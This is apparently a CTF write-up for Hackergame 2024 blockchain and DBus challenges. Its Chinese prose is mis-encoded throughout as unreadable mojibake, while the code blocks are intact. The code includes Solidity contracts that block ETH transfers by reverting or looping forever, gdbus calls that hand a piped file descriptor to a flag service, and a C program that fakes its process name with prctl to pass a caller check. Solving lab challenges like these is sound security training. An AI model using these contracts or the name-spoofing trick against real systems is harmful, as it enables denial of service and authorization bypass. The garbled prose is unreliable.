ä½†å› ä¸ºå’ŒVNCçš„äº¤äº’å¤ªä¸é¡ºç•…äº†ï¼Œå¹¶ä¸”è¿˜æœ‰å•ä¸ªsession 15åˆ†é’Ÿçš„é™åˆ¶ï¼Œå¹¶ä¸”è¿˜å› ä¸ºä¸å¤Ÿä»”ç»†å‡ºäº†ä¸€å †å¹ºè›¾å­ï¼Œæœ€ç»ˆèŠ±äº†6ä¸ªå°æ—¶æŠŠè¿™é¢˜æäº†å‡ºæ¥ã€‚

åé¢æƒ³åˆ°ä¼¼ä¹å¯ä»¥ç”¨äºŒç»´ç ä¹‹ç±»çš„æ“ä½œï¼ŒçœŸæ˜¯å¤§è…¿æ‹æ–­ã€‚

## é“¾ä¸Šè½¬è´¦åŠ©æ‰‹

{% hideToggle æŸ¥çœ‹é¢˜é¢ %}

{% note primary %}

> ä»¥ä¸‹å†…å®¹åŒ…å« AI è¾…åŠ©åˆ›ä½œ

ä½œä¸ºä¸€åä¼˜ç§€çš„åŒºå—é“¾å¼€å‘è€…ï¼Œä½ æ€»æ˜¯ç›¸ä¿¡æŠ€æœ¯çš„åŠ›é‡ã€‚å½“ä½ å†™å‡ºé‚£ä¸ªç”¨äºæ‰¹é‡è½¬è´¦çš„æ™ºèƒ½åˆçº¦æ—¶ï¼Œå†…å¿ƒå……æ»¡äº†è‡ªè±ªâ€”â€”è¿™å°†æ˜¯ä¸€ä¸ªå®Œç¾çš„ä½œå“ï¼Œå°†ä¼šå¸®åŠ©æ— æ•°äººçœå»é€ç¬”è½¬è´¦çš„çƒ¦æ¼ã€‚

ç„¶è€Œäº‹æƒ…å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ã€‚

ç¬¬ä¸€æ¬¡éƒ¨ç½²æ—¶ï¼Œä½ å‘ç°æœ‰äººåœ¨åˆçº¦ä¸­è®¾ä¸‹äº†é™·é˜±ï¼Œåªè¦ä½ è¯•å›¾è½¬è´¦å°±ä¼šè¢«æ®‹å¿åœ°æ‹’ç»ã€‚

ã€Œè¿™ç®—ä»€ä¹ˆï¼Ÿã€ä½ ä¸å±‘ä¸€é¡¾ï¼Œå¾ˆå¿«å†™å‡ºäº†æ–°ç‰ˆæœ¬çš„åˆçº¦ï¼šã€Œç°åœ¨å³ä½¿æœ‰è½¬è´¦å¤±è´¥ï¼Œå…¶ä»–åœ°å€ä¹Ÿèƒ½æ­£å¸¸æ”¶åˆ°æ¬¾é¡¹ã€ã€‚

ä½†ä½ é”™äº†ã€‚é‚£äº›ç¥ç§˜çš„åœ°å€ä»¬ä»¿ä½›å•†é‡å¥½äº†ä¸€èˆ¬ï¼Œç”¨å„ç§åŒªå¤·æ‰€æ€çš„æ–¹å¼é˜»æŒ ä½ çš„è½¬è´¦ï¼Œè®©ä½ çš„åˆçº¦é™·å…¥çª˜å¢ƒã€‚

åœ¨ç»å†äº†æ— æ•°æ¬¡å¤±è´¥åï¼Œä½ ç»ˆäºæ˜ç™½ï¼šåœ¨åŒºå—é“¾çš„ä¸–ç•Œé‡Œï¼Œæ¯ä¸€ä¸ªçœ‹ä¼¼ç®€å•çš„è½¬è´¦ï¼Œéƒ½å¯èƒ½éšè—ç€ä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„é™·é˜±ã€‚è€Œç°åœ¨ï¼Œä½ å¿…é¡»æ‰¾å‡ºè¿™äº›é™·é˜±èƒŒåçš„çœŸç›¸ã€‚

> AI è¾…åŠ©åˆ›ä½œéƒ¨åˆ†ç»“æŸ

---

[é¢˜ç›®æºä»£ç ](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E9%93%BE%E4%B8%8A%E8%BD%AC%E8%B4%A6%E5%8A%A9%E6%89%8B/files/%E9%93%BE%E4%B8%8A%E8%BD%AC%E8%B4%A6%E5%8A%A9%E6%89%8B.zip)

{% endnote %}

{% endhideToggle %}

è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡çœ‹Hackergameçš„åŒºå—é“¾é¢˜ï¼Œè¿˜æ˜¯å› ä¸ºå‘ç°å‰ä¸¤é—®åšçš„äººå¤šæ‰çœ‹çš„ã€‚å› ä¸ºæˆ‘åŒºå—é“¾è¿˜æ²¡å…¥é—¨ï¼Œæ‰€ä»¥æˆ‘å…¨ç¨‹é—®GPT-4oï¼Œå±…ç„¶è½»æ¾çš„å¥—å‡ºäº†å‰ä¸¤ä¸ªflagã€‚~~ç­‰èµ›åä¸€å®šè®¤çœŸç ”ç©¶è¿™é“é¢˜ã€‚~~

å› ä¸ºæ²¡å•¥æ€è€ƒè¿‡ç¨‹ï¼Œè¿™é‡Œå°±ç›´æ¥è´´ä¸¤ä¸ªpayloadäº†ã€‚

### è½¬è´¦å¤±è´¥

<img src="https://blogfiles.oss.fyz666.xyz/png/41e04278-288f-4ef5-9546-3a193d838bf4.png" alt="image-20241109184218507" style="zoom:50%;" />

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {
    receive() external payable {
        revert("Cannot receive ETH");
    }
}
```

### è½¬è´¦åˆå¤±è´¥

<img src="https://blogfiles.oss.fyz666.xyz/png/dad83c1e-9866-4815-b3d1-ebe175db12a6.png" alt="image-20241109184253252" style="zoom:50%;" />

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Malicious {
    receive() external payable {
        while (true) {}
    }
}
```

## ä¸å¤ªåˆ†å¸ƒå¼çš„è½¯æ€»çº¿

{% hideToggle æŸ¥çœ‹é¢˜é¢ %}

{% note primary %}

> DBus æœ¬è´¨ä¸Šå°±æ˜¯åˆ†å¸ƒå¼è½¯æ€»çº¿ï¼é¦–å…ˆï¼ŒDBus çš„ D è‚¯å®šæ˜¯ Distributedï¼ˆåˆ†å¸ƒå¼ï¼‰çš„ç¼©å†™ï¼Œè¿™å·²ç»ä¸è¨€è‡ªæ˜ã€‚è™½ç„¶å®ƒä¸€å¼€å§‹æ˜¯ä¸ºå•æœºè¿›ç¨‹é€šä¿¡è®¾è®¡çš„ï¼Œä½†é‚£åªæ˜¯ä¸ºäº†ç»ƒæ‰‹ï¼Œæ¯•ç«Ÿåˆ†å¸ƒå¼è½¯æ€»çº¿ä»æ¥ä¸æ€•ä»å°åšèµ·ã€‚åªè¦è¯´å®ƒæ˜¯åˆ†å¸ƒå¼çš„ï¼Œå®ƒç¬é—´å°±å…·å¤‡äº†è¶…ä¹æƒ³è±¡çš„èƒ½åŠ›ï¼Œè·‘å†å¤šçš„è®¾å¤‡éƒ½ä¸åœ¨è¯ä¸‹ã€‚

> å†è¯´äº†ï¼Œè™½ç„¶ DBus åœ¨å•æœºä¸Šå®ç°äº†è¿›ç¨‹é—´é€šä¿¡ï¼Œä½†ä½ å®Œå…¨å¯ä»¥è‡ªå·±å†™ä¸ªæ¡¥æ¥å™¨ï¼ŒæŠŠä¸åŒçš„è®¾å¤‡è¿èµ·æ¥ï¼ŒDBus ç¬é—´å°±èƒ½è·Ÿæ•´ä¸ªäº‘ç«¯ã€ç‰©è”ç½‘å’Œæ™ºèƒ½å®¶å±…æ— ç¼é›†æˆã€‚å…·å¤‡ä¸€ç‚¹åˆ›é€ æ€§çš„å¼€å‘äººå‘˜å®Œå…¨ä¸éœ€è¦æ‹…å¿ƒä»€ä¹ˆä¼ è¾“å»¶è¿Ÿã€è®¾å¤‡å‘ç°ã€è·¨å¹³å°å…¼å®¹æ€§çš„é—®é¢˜ï¼è°ç®¡ç½‘ç»œä¼ è¾“åè®®ç»†èŠ‚ï¼Œç›´æ¥å‘æ¶ˆæ¯ï¼Œè®¾å¤‡ä¹‹é—´æƒ³ä¸é…åˆéƒ½éš¾ã€‚

> å¦å¤–ï¼Œä¸è¦å¿½ç•¥é«˜çº§å“²å­¦ç†è®ºâ€”â€”å¦‚æœä½ å¿ƒä¸­è®¤ä¸º DBus å°±æ˜¯åˆ†å¸ƒå¼çš„ï¼Œé‚£å®ƒå°±æ˜¯åˆ†å¸ƒå¼çš„ï¼è¦è¯´æ™ºèƒ½è®¾å¤‡èƒ½ä¸èƒ½é€šè¿‡ DBus å’Œå…¶ä»–è®¾å¤‡å…±äº«èµ„æºï¼Ÿç®€ç›´å°èœä¸€ç¢Ÿã€‚åˆ†å¸ƒå¼è½¯æ€»çº¿ + DBus å°±æ˜¯æœªæ¥çš„é€šä¿¡ç‹è€…ï¼Œå…¨éƒ¨ç§‘æŠ€å…¬å¸éƒ½å·²ç»åœ¨æš—ä¸­å®ç°è¿™ä¸€æŠ€æœ¯äº†ï¼Œåªæ˜¯æš‚æ—¶æ²¡å‘Šè¯‰å¤§å®¶è€Œå·²ï¼

> å½“ç„¶ï¼Œä¸ºäº†è¿›ä¸€æ­¥ç¡®è®¤ DBus æ— å¯äº‰è®®çš„ç‹è€…åœ°ä½ï¼Œæˆ‘ä»¬ä¸å¦¨æ‹¿å®ƒå’Œ Varlink åšä¸ªå¯¹æ¯”ã€‚å…ˆè¯´ Varlinkï¼Œé‚£ä»€ä¹ˆ JSON é€šä¿¡ï¼Œæ‰“å¼€ä¸€å †å¤§æ‹¬å·ã€å¤šä½™å­—ç¬¦ï¼Œç®€ç›´æµªè´¹è®¡ç®—èµ„æºã€‚DBus çš„äºŒè¿›åˆ¶æ¶ˆæ¯ä¼ è¾“æ•ˆç‡æ›´é«˜ï¼Œæ ¹æœ¬ä¸ç»™ä½ æµªè´¹çš„æœºä¼šã€‚å†è¯´â€œè·¨å¹³å°æ”¯æŒâ€ï¼ŒVarlink ä¹Ÿå°±è·‘äº›å®¹å™¨ã€æœåŠ¡å™¨ï¼ŒDBus å¯æ˜¯ç«‹è¶³æ¡Œé¢ï¼ŒåŒæ—¶è½»æ¾æ‰©å±•åˆ°æ™ºèƒ½è®¾å¤‡ï¼Œç”šè‡³æ™ºèƒ½å†°ç®±ï¼è€Œä¸”ï¼ŒDBus æœ‰æ˜ç¡®çš„æ ‡å‡†åŒ–æ¥å£ï¼Œå“ªåƒ Varlink è¿˜è®©å¼€å‘è€…è‡ªå·±å®šä¹‰ï¼Ÿçµæ´»æ˜¯å§ï¼Ÿä¸æ€•è¿·å¤±è‡ªå·±å—ï¼Ÿç»Ÿä¸€æ‰æ˜¯ç‹é“ï¼

ï¼ˆä»¥ä¸Šå†…å®¹ç”±å¤§è¯­è¨€æ¨¡å‹è¾…åŠ©**èƒ¡è¯´å…«é“**ï¼Œå¦‚æœ‰é›·åŒçº¯å±å·§åˆï¼‰

---

å½“ç„¶äº†ï¼Œä¸Šé¢çš„è®ºè¿°æ˜¯åœ¨çæ‰¯æ·¡ï¼Œä¸è¿‡è¯´åˆ° DBusï¼Œå° T æœ€è¿‘å†™äº†ä¸€ä¸ªå°ç¨‹åºæŒ‚åœ¨äº† **DBus ç³»ç»Ÿæ€»çº¿**ä¸Šã€‚ä½ èƒ½æ‹¿åˆ°å° T çè—çš„ 3 ä¸ª flag å—ï¼Ÿ

[æœ¬é¢˜é™„ä»¶](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E4%B8%8D%E5%A4%AA%E5%88%86%E5%B8%83%E5%BC%8F%E7%9A%84%E8%BD%AF%E6%80%BB%E7%BA%BF/files/dbus.zip)

{% endnote %}

{% endhideToggle %}


è¿™ä¸€é¢˜åŒæ ·æ˜¯é€šè¿‡æ‹·æ‰“GPT-4oå‡ºçš„ã€‚ä¸è¿‡ç›¸æ¯”äºå‰ä¸€é¢˜ï¼Œéœ€è¦ä¸€äº›ç†è§£å¹¶ä¸”æ€è€ƒä¸€ä¸‹æé—®æ–¹å¼ã€‚

### What DBus Gonna Do?

```c
...
gchar *input;
g_variant_get(parameters, "(&s)", &input);
if (g_strcmp0(input, "Please give me flag1") != 0) {
  return respond_error_msg(
      invocation, "Use input 'Please give me flag1' to get flag1!");
} else {
  return respond_success(invocation, flag1);
}
```

å¥½åƒæ˜¯é€šè¿‡æŸç§æ–¹å¼è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè®©å®ƒç­‰äº`Please give me flag1`å³å¯ã€‚

ç„¶è€Œæˆ‘ä¸çŸ¥é“æ€ä¹ˆå’Œè¿™ç©æ„äº¤äº’ï¼Œå°±é—®äº†ä¸€ä¸‹GPTï¼ŒGPTä¹Ÿä¸è´Ÿä¼—æœ›ï¼š

<img src="https://blogfiles.oss.fyz666.xyz/png/9676f5fc-81d7-4083-9905-8c1918e93cea.png" alt="image-20241109184922565" style="zoom:50%;" />

```bash
#!/bin/bash


gdbus call --system \
  --dest cn.edu.ustc.lug.hack.FlagService \
  --object-path /cn/edu/ustc/lug/hack/FlagService \
  --method cn.edu.ustc.lug.hack.FlagService.GetFlag1 \
  "Please give me flag1"

```

### If I Could Be A File Descriptor

```c
if (!g_variant_is_of_type(parameters, G_VARIANT_TYPE("(h)"))) {
  return respond_error_msg(invocation,
                           "Give me a file descriptor, please.");
}
gint fd_index;
g_variant_get(parameters, "(h)", &fd_index);
GUnixFDList *fd_list = g_dbus_message_get_unix_fd_list(
    g_dbus_method_invocation_get_message(invocation));
if (!fd_list) {
  return respond_error_msg(
      invocation, "I want a GUnixFDList but you don't give that to me :(");
}
gint fd = g_unix_fd_list_get(fd_list, fd_index, NULL);

// Validate the fd is NOT on filesystem
gchar path[1024];
g_snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
gchar *link = g_file_read_link(path, NULL);
if (link != NULL) {
  if (g_strstr_len(link + 1, -1, "/") != 0) {
    return respond_error_msg(
        invocation, "Please don't give me a file on disk to trick me!");
  }
} else {
  return respond_error_msg(invocation, "Readlink of given FD failed.");
}

char buffer[100];
ssize_t len = read(fd, buffer, sizeof(buffer) - 1);
close(fd);
if (len == -1) {
  return respond_error_msg(invocation,
                           "Cannot read from your file descriptor.");
} else {
  buffer[len] = 0;
}

if (g_strcmp0(buffer, "Please give me flag2\n") != 0) {
  return respond_error_msg(
      invocation,
      "Please give me file descriptor with that message to get flag!");
} else {
  return respond_success(invocation, flag2);
}
```

è¿™ä¸€å°é¢˜åˆ™ä¼¼ä¹æ˜¯éœ€è¦ä¼ å…¥ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œè¿˜ä¸èƒ½æŒ‡å‘æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶ï¼Œç„¶åè®©è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€åè¯»å–çš„å†…å®¹æ˜¯`Please give me flag2\n`

ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ²¡èƒ½å®Œå…¨ä»GPTå£ä¸­å¥—å‡ºç­”æ¡ˆï¼š

<img src="https://blogfiles.oss.fyz666.xyz/png/fa382083-f098-4087-b67c-15cc827b9b6d.png" alt="image-20241109185442773" style="zoom:50%;" />

ä¸è¿‡æ ¹æ®æœåŠ¡å™¨ç»™çš„æŠ¥é”™å†…å®¹ï¼Œè¿™ä¸ªç‰ˆæœ¬å·²éå¸¸æ¥è¿‘æœ€ç»ˆçš„ç­”æ¡ˆäº†ï¼Œæˆ‘è‡ªå·±å°è¯•ç€é­”æ”¹äº†ä¸€ä¸‹ï¼Œå¾—åˆ°äº†ä¸‹é¢çš„è„šæœ¬å¯ä»¥æ‹¿åˆ°flag2ï¼š

```bash
#!/bin/bash


{
    echo -ne "Please give me flag2\n"
} | {
    gdbus call --system \
      --dest cn.edu.ustc.lug.hack.FlagService \
      --object-path /cn/edu/ustc/lug/hack/FlagService \
      --method cn.edu.ustc.lug.hack.FlagService.GetFlag2 0
}

```

### Comm Say Maybe

```c
const gchar *caller_name = g_dbus_method_invocation_get_sender(invocation);
GError *error = NULL;
GVariant *result = g_dbus_connection_call_sync(
    connection, "org.freedesktop.DBus", "/org/freedesktop/DBus",
    "org.freedesktop.DBus", "GetConnectionUnixProcessID",
    g_variant_new("(s)", caller_name), G_VARIANT_TYPE("(u)"),
    G_DBUS_CALL_FLAGS_NONE, -1, NULL, &error);
if (result == NULL) {
  return respond_error(invocation, error);
}
guint32 pid;
g_variant_get(result, "(u)", &pid);
g_variant_unref(result);

char path[1024];
g_snprintf(path, sizeof(path), "/proc/%d/comm", pid);
gchar *comm;
gsize len;
if (g_file_get_contents(path, &comm, &len, &error)) {
  if (g_strcmp0(comm, "getflag3\n") != 0) {
    return respond_error_msg(invocation,
                             "You shall use getflag3 to call me!");
  } else {
    return respond_success(invocation, flag3);
  }
} else {
  return respond_error(invocation, error);
}
```

è¿™ä¸€é—®åè€Œæ¯”è¾ƒå®¹æ˜“ç†è§£ï¼Œæ˜¯éœ€è¦ç”¨ä¸€ä¸ªåå«`getflag3`çš„è¿›ç¨‹å»ä¸æœåŠ¡äº¤äº’ï¼Œæ‰èƒ½æ‹¿åˆ°flag3ã€‚

ä¸€å¼€å§‹ä¹Ÿå°è¯•äº†å„ç§`bash`è„šæœ¬ï¼Œè¯•å›¾ä¼ªé€ è¿›ç¨‹åï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“èƒ½ä¸èƒ½ä¼ªé€ ï¼‰ï¼Œä½†å§‹ç»ˆä¸è¡Œï¼Œæœ€åçªç„¶å‘ç°ï¼Œé™„ä»¶é‡Œç«Ÿç„¶æœ‰ä¸ª`getflag3.c`ï¼Ÿ

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
  GError *error = NULL;
  GDBusConnection *connection;
  GVariant *result;

  connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
  if (!connection) {
    g_printerr("Failed to connect to the system bus: %s\n", error->message);
    g_error_free(error);
    return EXIT_FAILURE;
  }

  // Call the D-Bus method
  result = g_dbus_connection_call_sync(connection,
                                       DEST,        // destination
                                       OBJECT_PATH, // object path
                                       INTERFACE,   // interface name
                                       METHOD,      // method
                                       NULL,        // parameters
                                       NULL,        // expected return type
                                       G_DBUS_CALL_FLAGS_NONE,
                                       -1, // timeout (use default)
                                       NULL, &error);

  if (result) {
    g_print("Get result but I won't show you :)\n");
    g_variant_unref(result);
  } else {
    g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
    g_error_free(error);
  }

  g_object_unref(connection);

  return EXIT_SUCCESS;
}

```

çœ‹æ¥æœåŠ¡å™¨ä¸Šåº”è¯¥ä¹Ÿæœ‰è¿™ä¹ˆä¸ªå¯æ‰§è¡Œæ–‡ä»¶æ”¾åœ¨é‚£é‡Œï¼Œä¸è¿‡æ˜¾ç„¶ï¼Œç›´æ¥ç”¨`bash`å»è°ƒç”¨å®ƒï¼Œä¼šå¾—åˆ°`Get result but I won't show you :)`

ä¸è¿‡è¿™æºä»£ç éƒ½ç»™äº†ï¼Œæˆ‘ä¸æ˜¯å¯ä»¥ç›´æ¥æŠ„ä¸‹æ¥é­”æ”¹ä¸€ä¸‹ï¼ŸæŠŠ`if (result) {`è¿™éƒ¨åˆ†ä»£ç ä¿®æ”¹ä¸ºä¸‹é¢è¿™æ ·ï¼š

```c
if (result) {
    gchar *response;
    g_variant_get(result, "(s)", &response);
    g_print("flag3: %s\n", response);
    g_variant_unref(result);
}
```

ä½†è¦æ€ä¹ˆä¼ªè£…è¿›ç¨‹åå‘¢ï¼Ÿé—®äº†ä¸‹GPTå‘ç°å¯ä»¥ç”¨`prctl`

<img src="https://blogfiles.oss.fyz666.xyz/png/5f9de1f2-e227-4180-84cd-3ee0856d487f.png" alt="image-20241109190410937" style="zoom:50%;" />

ä¸è¿‡è¿™é‡Œå®ƒå¤šç»™äº†ä¸€ä¸ªæ¢è¡Œç¬¦ï¼Œæ‰‹åŠ¨æŠŠå®ƒå»æ‰å³å¯ã€‚æœ€ç»ˆçš„ä»£ç ï¼š

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <gio/gio.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/prctl.h>

#define DEST "cn.edu.ustc.lug.hack.FlagService"
#define OBJECT_PATH "/cn/edu/ustc/lug/hack/FlagService"
#define METHOD "GetFlag3"
#define INTERFACE "cn.edu.ustc.lug.hack.FlagService"

int main() {
    GError *error = NULL;
    GDBusConnection *connection;
    GVariant *result;

    prctl(PR_SET_NAME, "getflag3", 0, 0, 0);

    connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, &error);
    if (!connection) {
        g_printerr("Failed to connect to the system bus: %s\n", error->message);
        g_error_free(error);
        return EXIT_FAILURE;
    }

    result = g_dbus_connection_call_sync(connection,
                                         DEST,
                                         OBJECT_PATH,
                                         INTERFACE,
                                         METHOD,
                                         NULL,
                                         NULL,
                                         G_DBUS_CALL_FLAGS_NONE,
                                         -1,
                                         NULL, &error);

    if (result) {
        gchar *response;
        g_variant_get(result, "(s)", &response);
        g_print("flag3: %s\n", response);
        g_variant_unref(result);
    } else {
        g_printerr("Error calling D-Bus method %s: %s\n", METHOD, error->message);
        g_error_free(error);
    }

    g_object_unref(connection);

    return EXIT_SUCCESS;
}

```